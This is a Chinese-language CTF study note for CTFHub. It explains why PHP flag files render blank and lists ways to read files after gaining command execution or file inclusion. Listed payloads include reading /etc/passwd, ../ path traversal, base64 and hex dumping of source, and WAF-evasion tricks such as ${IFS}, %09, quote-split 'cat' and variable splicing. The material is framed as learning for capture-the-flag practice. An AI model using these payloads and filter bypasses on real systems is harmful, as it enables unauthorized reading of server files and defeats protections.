信息读取小专栏

写在前面:我们会遇见获取信息困难的情况,比如在Ctfhub中获取flag,有时网页中会返回空白,这时候往往需要用到base64获取信息再进行解码,于是我在ai的帮助下,在此梳理一些信息读取的方法.

分析Ctfhub中网页显白的原因:

  • A.浏览器层面: 因为HTML是由各种标签组成的,在网页用Ctrl+U就能看见源码,你会发现里面有很多<符号,浏览器遇见<开头的,就会试图找到对应的标签.遇见<?这种根本不认识的,不合规的标签结构,浏览器会直接把它当做”无效代码”给过滤掉,既不显示,也不报错.
  • B.服务器层面: 如果直接访问一个.php文件,服务器其实是先把它执行了,然后吐一个空壳给浏览器.如果执行没输出,浏览器拿到的就是空白.

那么<究竟来自于哪里呢?是我们的一句话木马里的<?导致的吗?

通过查询,我得出答案,不是的,是我们要查询的目标文件里的<.因为Ctfhub中的flag经常放在.php文件中,所以里面用到的php语法自带有<,而且这个php文件没有echo内容,因此没有回显

访问的两种情况:

  • A, 根据路径直接访问我们的目标文件，服务器端会执行目标文件（.php格式），但是由于这份文件里没有echo，所以没有回显
  • B, 通过调用一句话木马来读取目标文件，比如用curl，它尝试会将目标文件原封不动的显示出来，但是浏览器看到<？却不认识，于是直接吃掉，干脆不显示

与我们的一句话木马一点关系都没有.

base64如何让浏览器放出内容？base64通过转码，将<变成字母和数字的乱码让浏览器以为是正常的内容，于是输出显示.

base64的优势在于简单粗暴，但是也有不足的地方：

  • a, 可能被高级一点的防火墙ban掉，实战环境中很多网站会将base64列为疑似黑客行为，不让执行，还可能留下记录
  • b, 长度:如果要读取的目标文件是长度比较大的，经过base64解码之后，长度更是会大大增加（会扩大33%），容易触发浏览器的URL限制，导致请求失败或者截断。

接下来，对不同场景下的的信息读取方法进行一个总结（来自于ai,个人进行了整理）

A,RCE命令执行:比如通过一句话木马和命令注入等控制服务器后,在终端中执行

a,对普通文本:以flag.txt为例

  • cat /flag:最常用,一次性把全文打印出来
  • tac /flag:反向打印(从最后一行读到第一行),可以防过滤(当WAF把cat禁了,用tac往往可以实现绕过)
  • nl /flag:带行号打印(方便看清结构),同时也有防过滤的功能
  • head -n 5 /flag 或 tail -n 5 /flag:只看前5行或后五行
  • more /flag 或 less /flag:分页查看(按空格键翻页,按q退出)(偶尔用于防止网页卡死,但体验一般)

b,对.php源码,图片二进制:

  • base64 /flag.php:将文件内容转成base64编码
  • xxd /flag.php 或 hexdump -C /flag.php:转成十六进制(Hex)来看,用于base64被WAF屏蔽时
  • strings /flag.png:只提取文件里可打印的字符.(flag藏在图片或者二进制文件里,用这个可以过滤掉乱码)

c,搜索与定位(对知道的信息很少的的文件)

  • ls -la:查看当前目录所有文件(包括隐藏文件.flag)
  • find / -name "*flag*" 2>/dev/null:全盘搜索文件名带flag的文件,其中2>/dev/null是为了屏蔽没权限的报错,让屏幕干净.
  • gre[ -r "ctfhub" /var/www/html/:全盘搜索文件内容中包含ctfhub的文件

B,LFI(文件包含/任意文件读取)用过URL读

a,直接用路径读取(普通文件)

  • ?file=/etc/passwd:直接读绝对路径
  • ?file=../../../../flag.txt:用../往上跳目录读.

b,PHP伪协议读取(对付各种源码)(可以防止,php文件被服务器执行)

  • 告诉服务器将源码的原文用base64的方式打包出来.
  • 解码后会得到纯净源码

C,客户端/外部工具读取(适用于网页限制太多的情况,直接在本地操作)

  • a, curl http://网址/flag.php:在终端中请求网页,直接拿到服务器的原样输出(避开浏览器吃字符的问题)
  • b, Ctrl+U:查看网页源码,看网页最初的样子

D,实战防拦截(如果cat /flag被WAF拦截了,说明空格或cat或/被拉黑了,这时候可以尝试一下变形)

a,空格被拦截

  • 用${IFS}代替空格:cat${IFS}/flag
  • 用<代替空格:cat</flag
  • 用%09(Tab键)代替空格:?cmd=cat%09/flag

b,cat被拦截

  • 用拼接:ca''t /flag或c\at /flag
  • 用通配符:/bin/ca* /fla*
  • 用变量:a=c;b=at;c=fl;d=ag; $a$b /$c$d

c,斜杠/被拦截了怎么办

用环境变量代替:cat ${PWD:0:1}flag –>PWD的第0到第一个字符刚好是/
